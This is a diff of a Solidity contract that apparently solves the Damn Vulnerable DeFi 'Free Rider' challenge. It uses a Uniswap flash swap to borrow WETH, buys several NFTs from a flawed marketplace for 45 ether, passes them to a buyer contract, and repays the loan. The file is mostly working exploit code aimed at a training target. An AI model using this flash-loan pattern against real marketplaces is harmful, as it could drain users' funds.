@@ -1,56 +1,59 @@
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
-import '@uniswap/lib/contracts/libraries/Babylonian.sol';
-import '@uniswap/lib/contracts/libraries/TransferHelper.sol';
+//import '@uniswap/lib/contracts/libraries/Babylonian.sol';
+//import '@uniswap/lib/contracts/libraries/TransferHelper.sol';
 
-import '@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol';
+//import '@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol';
 import '@uniswap/v2-periphery/contracts/interfaces/V1/IUniswapV1Factory.sol';
 import '@uniswap/v2-periphery/contracts/interfaces/V1/IUniswapV1Exchange.sol';
-import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol';
+//import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol';
 import '@uniswap/v2-periphery/contracts/interfaces/IERC20.sol';
 import '@uniswap/v2-periphery/contracts/interfaces/IWETH.sol';
 import 'hardhat/console.sol';
 import "../Problems/damnvulnerabledefi/utils/WETH9.sol";
-import "@uniswap/v2-periphery/node_modules/@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
+import "../Problems/damnvulnerabledefi/10/FreeRiderNFTMarketplace.sol";
+import "../Problems/damnvulnerabledefi/10/FreeRiderBuyer.sol";
 //import '@uniswap/v2-core/contracts/libraries/SafeMath.sol';
+import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
-contract FreeRiderContractor is IUniswapV2Callee {
-    using SafeMath  for uint;
+contract FreeRiderContractor is IUniswapV2Callee, IERC721Receiver {
+    //    using SafeMath  for uint;
     IUniswapV2Factory FACTORY;
-    WETH9 WETH;
-    uint256 balance0;
-    uint256 balance1;
-    uint112 _reserve0;
-    uint112 _reserve1;
-    uint32 a;
+    address payable WETH;
+    FreeRiderNFTMarketplace marketPlace;
+    FreeRiderBuyer buyer;
 
 
     event Log(string message, uint val);
 
-    constructor(address _factory, address payable weth) public {
+    constructor(address _factory, address payable weth, address payable _marketplace, address _buyer) public payable {
         FACTORY = IUniswapV2Factory(_factory);
-        WETH = WETH9(weth);
+        WETH = weth;
+        marketPlace = FreeRiderNFTMarketplace(_marketplace);
+        buyer = FreeRiderBuyer(_buyer);
     }
 
     // needs to accept ETH from any V1 exchange and WETH. ideally this could be enforced, as in the router,
     // but it's not possible because it requires a call to the v1 factory, which takes too much gas
     receive() external payable {}
 
-    function doFlashSwap(address tokenBorrowed, uint256 amount) public {
-        address pair = FACTORY.getPair(tokenBorrowed, address(WETH));
+    function doFlashSwap(uint256[] calldata idList, address tokenBorrowed, uint256 amount) public {
+        address pair = FACTORY.getPair(tokenBorrowed, WETH);
         require(pair != address(0), "Pair does not exist");
 
         address token0 = IUniswapV2Pair(pair).token0();
         address token1 = IUniswapV2Pair(pair).token1();
 
-        uint256 amount0Out = (tokenBorrowed == token0) ? amount : 0;
-        uint256 amount1Out = (tokenBorrowed == token1) ? amount : 0;
+        uint256 amount0Out = (WETH == token0) ? amount : 0;
+        uint256 amount1Out = (WETH == token1) ? amount : 0;
 
-        bytes memory data = abi.encode(tokenBorrowed, amount);
-        console.log("DONE123");
+        bytes memory data = abi.encode(idList, amount);
+
+
         IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
-        console.log("DONE");
 
     }
 
@@ -63,41 +66,32 @@ contract FreeRiderContractor is IUniswapV2Callee {
         require(msg.sender == pair, "Pair is invalid");
         require(sender == address(this), "Address should be this contract");
 
-        (address tokenBorrowed, uint256 amount) = abi.decode(data, (address, uint));
+        (uint256[] memory idList, uint256 amount) = abi.decode(data, (uint256[], uint));
+        WETH9(WETH).withdraw(45 ether);
+        marketPlace.buyMany{value : 45 ether}(idList);
+        for (uint256 i = 0; i < idList.length; i++) {
+            marketPlace.token().safeTransferFrom(address(this), address(buyer) , idList[i], "");
+        }
 
-        //        uint256 fee = ((amount * 3) / 997) + 1;
-        uint256 amountToRepay = amount;
+        uint256 fee = ((amount * 3) / 997) + 1;
+        uint256 amountToRepay = amount + fee;
+        WETH9(WETH).deposit{value: 45 ether}();
+        console.log("amountToRepay",  marketPlace.token().ownerOf(0));
+        console.log("address",  address (this));
+        IERC20(WETH).transfer(pair, amountToRepay);
 
-        //        emit Log("Amount0", token0);
-        //        emit Log("Amount1", token1);
-        console.log("Amount", amount);
-        console.log("amountToRepay", amountToRepay);
-        console.log("tokenBorrowed", IERC20(tokenBorrowed).balanceOf(msg.sender));
+    }
 
-        IERC20(tokenBorrowed).transfer(pair, amountToRepay);
-        console.log("tokenBorrowed", IERC20(tokenBorrowed).balanceOf(msg.sender));
-
-        balance0 = IERC20(token0).balanceOf(pair);
-        balance1 = IERC20(token1).balanceOf(pair);
-        (_reserve0, _reserve1, a) = IUniswapV2Pair(address(pair)).getReserves();
-
-        uint amount0In = balance0 > _reserve0 - amount0 ? balance0 - (_reserve0 - amount0) : 0;
-        uint amount1In = balance1 > _reserve1 - amount1 ? balance1 - (_reserve1 - amount1) : 0;
-        require(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');
-        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
-        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
-        console.log("_reserve0 ",_reserve0);
-        console.log("_reserve1 ",_reserve1);
-        console.log("balance0 ",balance0);
-        console.log("balance1 ",balance1);
-        console.log("amount0In ",amount0In);
-        console.log("amount1In ",amount1In);
-        console.log("balance0Adjusted ",balance0Adjusted);
-        console.log("balance1Adjusted", balance1);
-        console.log("balance1Adjusted", 15000 ether - balance1Adjusted);
-        console.log(balance0Adjusted.mul(balance1Adjusted));
-        console.log(uint(_reserve0).mul(_reserve1).mul(1000 ** 2));
-        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000 ** 2), 'UniswapV2: K');
-
+    function onERC721Received(
+        address from,
+        address to,
+        uint256 _tokenId,
+        bytes memory data
+    )
+    external
+    override
+    returns (bytes4)
+    {
+        return IERC721Receiver.onERC721Received.selector;
     }
 }
